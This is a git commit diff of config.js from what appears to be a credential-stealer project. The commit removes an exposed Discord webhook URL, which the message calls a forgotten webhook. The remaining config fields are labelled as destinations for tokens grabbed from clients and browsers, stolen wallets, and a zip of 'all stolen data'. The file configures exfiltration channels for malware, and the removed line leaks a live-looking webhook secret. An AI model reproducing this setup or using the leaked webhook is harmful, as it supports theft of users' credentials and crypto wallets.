87d47b81aaf0a8ba9bdc69522f9ff6ea325ab24f
doener <79750105+doener2323@users.noreply.github.com>
2022-05-08 18:22:12 +0200

    forgot my webhook inside there

--- config.js
+++ config.js
@@ -1,6 +1,6 @@
 module.exports = (client) => {
     return {
-        url: "https://discord.com/api/webhooks/972891149461254234/ptQpbxDR1AxBNYFxA1Kmb9tIqCkfr272mILMvPfQwTX2eZnHTfkukTazPRT56wQ9754-", // main webhook url (when initialized)
+        url: "", // main webhook url (when initialized)
         discord: "", // grabbed tokens from clients & browsers
         wallets: "", // stolen wallets
         zip: "", // webhook where the zip folder with all stolen data will be sent in
